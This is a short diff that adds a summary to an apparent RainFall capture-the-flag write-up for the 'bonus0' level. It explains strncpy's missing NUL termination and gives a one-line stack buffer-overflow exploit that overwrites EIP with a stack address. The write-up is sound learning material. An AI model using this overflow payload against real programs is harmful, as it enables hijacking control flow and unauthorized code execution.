@@ -1,4 +1,19 @@
 
+TLDR
+
+```
+char *strncpy(char *dst,  char *src, size_t len);
+
+copy at most len characters from src into dst.  If src
+is less than len characters long, the remainder of dst is filled with `\0' characters.  Otherwise, dst is not terminated.
+strncpy() does not guarantee to NUL terminate the result itself, this must be done explicitly.
+
+eip is at ofsset 9, strncpy size is 20 ,  buffer size [min, max] = [20, 4095]
+
+bonus0@RainFall:~$ (python -c 'print "A" * 200' ; python -c 'print "A" * 9 + "\xbf\xff\xfe\xd8"[::-1] + "C" * 70'; cat) | ./bonus0
+```
+
+
 ```
 bonus0@RainFall:~$ objdump -t bonus0 | grep text
 080484b4 g     F .text	0000006a              p
